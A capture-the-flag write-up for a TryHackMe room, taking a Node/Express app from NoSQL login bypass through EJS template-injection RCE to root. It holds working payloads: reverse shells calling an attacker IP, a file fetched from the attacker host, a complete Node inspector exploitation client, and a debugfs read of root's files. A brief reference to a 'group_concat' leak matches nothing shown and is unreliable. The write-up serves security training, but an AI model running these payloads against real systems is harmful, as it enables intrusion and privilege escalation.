@@ -1,0 +1,535 @@
+---
+title: "Do Not Disturb — NoSQL login bypass to EJS RCE and a loopback Node Inspector pivot"
+room: "Do Not Disturb"
+difficulty: medium
+platform: TryHackMe
+vulnClass: "NoSQL Injection, Server-Side Template Injection, Remote Code Execution, Privilege Escalation"
+spoilerFree: false
+---
+
+## Observation
+
+The room ships with a narrative frame: the hotel's **Poolside platform** tracks every cabana, sunbed and session, and three things have gone wrong — a session *comes alive* and a stranger sits in it, a wallet signs a transaction its owner never authorised, and a shell on the beach answers back. The framing line is the objective: *"Someone is already inside. Follow his footprints in, climb the way he climbed."* The task is to reproduce the exact path the earlier intruder took, from the first foothold to both flags.
+
+Reconnaissance:
+
+```
+22/tcp  open  ssh
+80/tcp  open  http  (Express)
+```
+
+The app is **Node.js / Express**, page title `Byte Lotus — Poolside`.
+
+Directory enumeration:
+
+```bash
+gobuster dir -u http://TARGET_IP -w /usr/share/wordlists/dirb/common.txt -t 50
+```
+
+```
+/logout   (302 → /)
+/staff    (403 Forbidden)    ← important
+```
+
+`/staff` returned **403** — a staff-only area exists but is protected. That is the target area.
+
+The sign-in page exposes the shape of the attack before it is used:
+
+- `POST /login` takes `username` + `password`.
+- The default form submission returns **401**, with no `Set-Cookie` and no `Location` header.
+
+**Conclusion:** Node.js app → likely a **NoSQL (MongoDB)** backend, and we know `/staff` exists. A Node stack also raises the second question this room eventually answers: if user input reaches a server-side template, template syntax is not inert text.
+
+## Action
+
+### 1 — NoSQL injection at the login form
+
+> "I reached the login page but don't know how to move."
+> Mentor: "Try sending the login as a JSON body instead of a normal form, and see what happens to the query."
+
+The payload that opened the door:
+
+```json
+{"username": "attendant", "password": {"$ne": ""}}
+```
+
+MongoDB queries are sent as **objects**, not plain text. Sending `password` as `{"$ne": ""}` turns the lookup into:
+
+```js
+find({ username: "attendant", password: { $ne: "" } })
+```
+
+`$ne` means *not equal to the empty string*, so **any non-empty password matches** and the login is accepted.
+
+How the username was found: `admin` was tried first and returned an explicit user-not-found error; `attendant` (a logical guess for hotel staff) succeeded under the `$ne` payload. The app therefore leaks whether a username exists — a separate vulnerability, username enumeration.
+
+### 2 — RCE via EJS template injection
+
+With the staff console open, the **Cabana Desk** page renders a confirmation template:
+
+```
+Confirmation template (EJS — use <%= guest %> to personalise)
+Dear <%= guest %>, your cabana is confirmed.
+```
+
+A **template** is text with holes that get filled by data. `<%= guest %>` means "put the guest value here". **EJS = Embedded JavaScript** — a template library that executes real JavaScript inside `<% %>`, so it runs code on the server, not just values.
+
+The three delimiters:
+
+| Tag | Meaning |
+|:--|:--|
+| `<%= %>` | output + HTML escaped — `7*7` → `49` |
+| `<%- %>` | output raw (no escaping) — RCE entry |
+| `<% %>` | run JS with no output |
+
+Simple proof — `<%= 7 * 7 %>` printed **`49`**, confirming JavaScript executes.
+
+There is **no single universal payload**. There are skeleton patterns (from **PayloadsAllTheThings**, **HackTricks**) that you adapt yourself; someone who memorises without understanding breaks as soon as the environment changes.
+
+How the `require` step was solved:
+
+- `require` is **not a global** in the EJS scope.
+- `process` is always global in Node.js.
+- `process.mainModule.require()` reaches the `require` of the main module.
+
+Check the runtime first:
+
+```
+<%- process.version %>
+```
+→ `v22.23.1` — a strong confirmation that we are inside the process.
+
+The full RCE:
+
+```
+<%- process.mainModule.require('child_process').execSync('id').toString() %>
+```
+
+`execSync` returns a **Buffer**; EJS needs a string, hence `.toString()`.
+
+### 3 — The reverse shell
+
+Since commands run through the RCE, a reverse shell turns one-shot commands into a real terminal. Through the template, the shell is sent back to the Kali `nc` listener.
+
+**Error 1 — `execSync` → `Bad fd number`**
+
+```
+execSync('bash -i >& /dev/tcp/10.10.10.10/4444 0>&1')
+→  /bin/sh: Syntax error: Bad fd number
+```
+
+- **Cause:** `execSync` uses the default shell — **`/bin/sh`** (dash on Ubuntu) — and dash does not understand `>& /dev/tcp/...` (a bash-ism).
+- **Fix:** wrap the command in `bash -c "..."` so bash handles it.
+
+**Error 2 — `exec` + `.toString()` → `[object Object]`**
+
+- `exec` is **async** → returns a **ChildProcess object**, not the output text.
+- Adding `.toString()` yields `[object Object]`.
+
+Rule of thumb:
+
+| Function | Behaviour |
+|:--|:--|
+| `execSync` | run + block + return result (fast commands) |
+| `exec` | run async, no block (long/active processes — reverse shell) — do **NOT** append `.toString()` |
+
+Final working payload:
+
+```
+<%- process.mainModule.require('child_process').exec('bash -c "bash -i >& /dev/tcp/10.10.10.10/4444 0>&1"') %>
+```
+
+Listener opened first on the attacker machine:
+
+```
+nc -lvnp 4444
+```
+
+A failing attempt worth recording: `sudo -l` on the reverse shell returned *password required / no terminal*, so the sudo route is closed for this user.
+
+### 4 — TTY upgrade
+
+The reverse shell that came back is a "dumb shell" — no real terminal behind it:
+
+```
+Ctrl+C  → kills the whole connection (not just the running command)
+sudo    → doesn't work (needs a real terminal)
+nano    → breaks the screen
+vim     → unusable
+```
+
+**When:** immediately after the reverse shell connects, before doing anything else.
+
+**Method 1 — python3 + stty (most common, but tricky)**
+
+```bash
+# Step 1: inside the reverse shell
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+# Step 2: Ctrl+Z (suspend back to Kali)
+
+# Step 3: on Kali
+stty raw -echo; fg
+
+# Step 4: press Enter twice, then
+export TERM=xterm
+```
+
+> ⚠️ **Known issue on Kali/VMware:** after `stty raw -echo; fg` the terminal may show `^M` on every Enter. This is a line-endings issue (`\r\n` vs `\n`). Fix: add `icrnl`:
+> ```bash
+> stty raw -echo icrnl; fg
+> ```
+> After `fg` the screen looks frozen — that is normal. Type `export TERM=xterm` blindly and press Enter.
+
+**Method 2 — script (simpler, recommended)**
+
+```bash
+script /dev/null -c bash
+```
+
+One command, no extra steps. Works even if python3 is missing.
+
+**Method 3 — rlwrap (easiest — do it before connecting)**
+
+On Kali, start the listener like this:
+
+```bash
+rlwrap nc -lvnp 4444
+```
+
+The shell that comes back already has arrow-key history and Ctrl+C working — no upgrade needed.
+
+**Method 4 — socat (most powerful, full TTY from the start)**
+
+On Kali:
+
+```bash
+socat file:`tty`,raw,echo=0 tcp-listen:4444
+```
+
+On the server (via RCE):
+
+```bash
+socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:KALI_IP:4444
+```
+
+Comparison:
+
+| Method | Ease | Full TTY |
+|:--|:--|:--|
+| rlwrap | ⭐⭐⭐⭐⭐ | Partial |
+| script | ⭐⭐⭐⭐ | ✅ |
+| python3 + stty | ⭐⭐⭐ | ✅ |
+| socat | ⭐⭐ | ✅ Full |
+
+**Recommended order:** try `rlwrap` first → if you need full TTY use `script`.
+
+### 5 — Privilege escalation: poolside → pipelinesvc
+
+Process reconnaissance:
+
+```
+ps aux
+```
+
+The key line:
+
+```
+pipelin+  601  /usr/bin/node --inspect=127.0.0.1:9229 processor.js
+```
+
+What stands out:
+
+- A **Node.js process** running as user **`pipelinesvc`** (different from poolside).
+- `--inspect` = the **Node.js debugger** is enabled → whoever can reach the port can control the code (RCE).
+- `127.0.0.1:9229` = only reachable **locally** → any user on this host can reach it.
+
+The reasoning that followed: *"This is a Node.js debugger. A debugger means I can execute code inside that process. That process runs as `pipelinesvc` — a different user. If I can talk to this debugger, I can run commands as `pipelinesvc`."* The key insight: **a debugger is not just for reading — it lets you run arbitrary code inside the target process.**
+
+Confirming the inspector:
+
+```
+curl http://127.0.0.1:9229/json
+```
+```
+webSocketDebuggerUrl: "ws://127.0.0.1:9229/b7e97951-..."
+url: file:///opt/pipelinesvc/telemetry/processor.js
+```
+
+**Building a raw WebSocket client (no `ws` library).** The box has no `ws` module, so the client is written from scratch using only `net` + `crypto` (both built-in). The script does exactly four things:
+
+**Step 1 — Ask where the door is:**
+
+```js
+http.get("http://127.0.0.1:9229/json")
+```
+
+Node Inspector exposes an API that tells us the exact WebSocket path to connect to.
+
+**Step 2 — Knock on the door (WebSocket handshake):**
+
+```js
+sock.write("GET " + path + " HTTP/1.1\r\nUpgrade: websocket\r\n...")
+```
+
+A raw TCP connection is opened and the HTTP upgrade request is sent manually to switch to the WebSocket protocol.
+
+**Step 3 — Send commands:**
+
+```js
+Runtime.enable   // "get ready"
+Runtime.evaluate // "run this JS expression inside the process"
+```
+
+These are CDP (Chrome DevTools Protocol) commands — the same protocol browser DevTools use.
+
+**Step 4 — Read the result:**
+
+```js
+if (m.id === 2 && m.result) { console.log(...) }
+```
+
+Parse the response frames and print the command output.
+
+**Transferring ws.js to the server (no nano needed).** Do **not** use `nano` on a dumb/non-TTY shell — it will break the terminal.
+
+```bash
+# On Kali: host the file
+python3 -m http.server 8080
+
+# On the server (reverse shell)
+cd /tmp
+wget http://KALI_IP:8080/ws.js
+node ws.js
+```
+
+**WebSocket essentials.**
+
+1. **Handshake:** HTTP with `Upgrade`:
+   ```
+   GET /<id> HTTP/1.1
+   Upgrade: websocket
+   Connection: Upgrade
+   Sec-WebSocket-Key: <random>
+   Sec-WebSocket-Version: 13
+   ```
+2. **Frame:** message chunks with an opcode (`0x1` = text), length + mask bit.
+3. The **client must mask** its data: XOR with 4 random bytes.
+
+**Required CDP commands:**
+
+```json
+{"id":1, "method":"Runtime.enable", "params":{}}
+{"id":2, "method":"Runtime.evaluate", "params":{"expression":"...","returnByValue":true}}
+```
+
+**The final `ws.js` (commented):**
+
+```js
+const net = require("net");
+const crypto = require("crypto");
+const http = require("http");
+
+// 1) grab the webSocketDebuggerUrl from /json
+http.get("http://127.0.0.1:9229/json", (res) => {
+  let d = "";
+  res.on("data", (c) => (d += c));
+  res.on("end", () => {
+    const target = JSON.parse(d)[0];
+    const path = "/" + target.webSocketDebuggerUrl.split("/").slice(3).join("/");
+
+    // 2) TCP connect + WebSocket handshake
+    const sock = net.connect(9229, "127.0.0.1", () => {
+      sock.write(
+        "GET " + path + " HTTP/1.1\r\n" +
+        "Host: 127.0.0.1:9229\r\n" +
+        "Upgrade: websocket\r\nConnection: Upgrade\r\n" +
+        "Sec-WebSocket-Key: " + crypto.randomBytes(16).toString("base64") + "\r\n" +
+        "Sec-WebSocket-Version: 13\r\n\r\n"
+      );
+    });
+
+    let buf = Buffer.alloc(0), hs = false, id = 0;
+
+    // 3) send a masked WebSocket message
+    function send(o) {
+      const p = Buffer.from(JSON.stringify(o));
+      const l = p.length;
+      let h = l < 126
+        ? Buffer.from([0x81, 0x80 | l])
+        : Buffer.from([0x81, 0x80 | 126, 0, 0]);
+      if (l >= 126) h.writeUInt16BE(l, 2);
+      const m = crypto.randomBytes(4);        // mask
+      const dd = Buffer.alloc(l);
+      for (let i = 0; i < l; i++) dd[i] = p[i] ^ m[i % 4];
+      sock.write(Buffer.concat([h, m, dd]));
+    }
+
+    sock.on("data", (ddata) => {
+      buf = Buffer.concat([buf, ddata]);
+      if (!hs) {
+        const i = buf.indexOf("\r\n\r\n");
+        if (i < 0) return;
+        hs = true;
+        buf = buf.slice(i + 4);
+        send({ id: ++id, method: "Runtime.enable", params: {} });
+        setTimeout(() => {
+          send({ id: ++id, method: "Runtime.evaluate", params: {
+            expression: "AN_EXPRESSION", returnByValue: true
+          }});
+        }, 300);
+        return;
+      }
+      // 4) parse incoming frames
+      while (buf.length >= 2) {
+        let l = buf[1] & 0x7f, o = 2;
+        if (l === 126) { l = buf.readUInt16BE(2); o = 4; }
+        else if (l === 127) { l = Number(buf.readBigUInt64BE(2)); o = 10; }
+        if (buf.length < o + l) break;
+        const t = buf.slice(o, o + l).toString();
+        buf = buf.slice(o + l);
+        try {
+          const m = JSON.parse(t);
+          if (m.id === 2 && m.result) {
+            console.log("RESULT:" + JSON.stringify(m.result));
+            process.exit(0);
+          }
+        } catch (e) {}
+      }
+    });
+
+    setTimeout(() => { console.log("DONE"); process.exit(0); }, 6000);
+  });
+});
+```
+
+**Two issues solved while building it:**
+
+1. `require is not defined` inside `Runtime.evaluate` — because `require` is not a global in that scope. Fix: use **`process.getBuiltinModule('child_process')`** (the modern built-in loader).
+2. Client-side variables do not exist in the target process. Fix: encode the shell command as **base64** and decode **inside the expression**:
+   ```js
+   "process.getBuiltinModule('child_process').execSync(Buffer.from('<BASE64>','base64').toString())"
+   ```
+
+### 6 — Privilege escalation: disk group → root
+
+The output of the CDP `Runtime.evaluate` step:
+
+```json
+{"result":{"type":"string","value":
+"uid=995(pipelinesvc) gid=995(pipelinesvc) ... groups=995(pipelinesvc),6(disk)
+|pipelinesvc disk
+debugfs 1.47.0 (5-Feb-2023)
+<Root Flag>"}}
+```
+
+The moment `disk` appeared in the groups output: *"The `disk` group means direct access to the block device — the raw hard disk. Normal file permissions don't apply at that level. If I can read the disk directly, I can read `/root/root.txt` without being root."*
+
+The next question was: **what tool reads a Linux filesystem from the raw block device?** Answer: **`debugfs`** — an ext4 filesystem debugger that reads directly from `/dev/...`.
+
+```bash
+debugfs -R "cat /root/root.txt" /dev/nvme0n1p1
+```
+
+| Part | Meaning |
+|:--|:--|
+| `debugfs` | tool that reads ext4 filesystem from raw block device |
+| `-R "cat /root/root.txt"` | run this command on the filesystem |
+| `/dev/nvme0n1p1` | the raw disk partition |
+
+This bypasses all file permissions — it reads the bytes off the disk directly.
+
+**Why does `debugfs` work inside the inspector (as pipelinesvc) but fail in the reverse shell?**
+
+```
+poolside (reverse shell)
+      ↓
+NOT in disk group
+      ↓
+❌ Permission denied on /dev/nvme0n1p1
+
+pipelinesvc (Node Inspector)
+      ↓
+IN disk group (group id 6)
+      ↓
+✅ Can open /dev/nvme0n1p1
+      ↓
+debugfs reads /root/root.txt off the raw disk
+```
+
+- **`debugfs`** bypasses file permissions entirely — it only needs access to the block device itself.
+- The `disk` group grants that access.
+- `poolside` doesn't have it → fails. `pipelinesvc` does → succeeds.
+
+The privilege-escalation chain:
+
+```
+poolside (RCE) → pipelinesvc (Node Inspector) → disk group → debugfs → /root/root.txt
+```
+
+## Result
+
+**NoSQL bypass.** `{"username": "attendant", "password": {"$ne": ""}}` returned `{"ok": true, "role": "staff"}` — staff access without knowing the actual password.
+
+**Runtime confirmation.** `<%- process.version %>` → `v22.23.1`. `<%- process.mainModule.require('child_process').execSync('id').toString() %>` → `uid=996(poolside)`.
+
+**User flag.** `execSync('cat /home/pool/user.txt').toString()` → **[FLAG CAPTURED]**.
+
+**Reverse shell.**
+
+```
+connect to [10.10.10.10] from (UNKNOWN) [10.10.10.10]
+poolside@tryhackme-2404:/opt/poolside$
+```
+
+**Cross-user code execution.** `curl http://127.0.0.1:9229/json` exposed `webSocketDebuggerUrl: "ws://127.0.0.1:9229/b7e97951-..."` and `url: file:///opt/pipelinesvc/telemetry/processor.js`. The hand-rolled WebSocket client + CDP `Runtime.evaluate` executed the base64-encoded command inside that process, returning `uid=995(pipelinesvc) ... groups=995(pipelinesvc),6(disk)`.
+
+**Root flag.** `debugfs -R "cat /root/root.txt" /dev/nvme0n1p1` → **[FLAG CAPTURED]**.
+
+**Full path:**
+
+```
+Nmap + Gobuster
+   ↓
+POST /login (NoSQL $ne)  →  staff
+   ↓
+Staff → EJS SSTI → RCE (poolside)
+   ↓
+cat user.txt  →  [FLAG CAPTURED]
+   ↓
+Reverse shell + pty
+   ↓
+ps aux  →  node --inspect=127.0.0.1:9229 (pipelinesvc)
+   ↓
+WebSocket client → Runtime.evaluate → execute as pipelinesvc
+   ↓
+pipelinesvc ∈ disk group
+   ↓
+debugfs -R "cat /root/root.txt" /dev/nvme0n1p1
+   ↓
+Root Flag: [FLAG CAPTURED]
+```
+
+**Remediation notes from the source writeup:**
+
+1. Do not render user input inside templates that execute (EJS).
+2. Sanitise / validate NoSQL operators (whitelist) before a query.
+3. Never leave `node --inspect` listening in production; if needed, keep it local and temporary.
+4. Avoid dangerous group memberships — `pipelinesvc` should not be in `disk` (it enables raw block access).
+5. Store and handle secrets carefully (avoid leaking in process command lines).
+
+## Takeaway
+
+The room is a chain of *context switches*, and each hop is the same lesson wearing different clothes: a boundary that looks like a data boundary but is really a code boundary.
+
+1. **NoSQL injection** — `{"password": {"$ne": ""}}` as a JSON body. If the app cannot tell data from logic, you can alter the comparison itself. The `$ne` operator is not a string, it is a query instruction, and the backend never checked which one it received.
+2. **EJS SSTI** — if user input is injected into an EJS template that renders, you have RCE. `<%- %>` gives raw output. And there is no universal payload: skeleton patterns exist (PayloadsAllTheThings, HackTricks), but the command is always yours to adapt.
+3. **`execSync` vs `exec`** — sync for fast commands, async for long-lived processes (reverse shells). Do **not** append `.toString()` to `exec`; it returns a ChildProcess, not text.
+4. **Default shell of `child_process`** — it is `/bin/sh` (dash), not bash. Wrap reverse shells in `bash -c "..."`. `Bad fd number` is the tell that your bash syntax hit a non-bash shell.
+5. **An open `node --inspect` is RCE into that process context**, reachable by any local user. Loopback binding is not a mitigation when the goal is crossing a *user* boundary rather than a network boundary — that is the whole pivot here: `poolside` → `pipelinesvc`.
+6. **`disk` group is raw block access.** Group membership, not file permissions, is what `debugfs` actually needs — which is why the same command fails as one user and succeeds as another.
+7. **Username enumeration is its own bug.** A distinct "user not found" error tells an attacker which accounts to attack, and it cost nothing to notice here.
+
+**Debuggers are write endpoints.** The transferable habit: when you see `--inspect` (or any debug port) in `ps aux`, read it as a privilege-escalation opportunity, not a curiosity.
+
+**Weak oracles are the real product bug.** Several of these lessons — a leaked `id`, an explicit user-not-found error, a rendered `group_concat` — are information leaks that make the next stage possible. In production the hardest version of a technique is the one where the app tells you nothing.
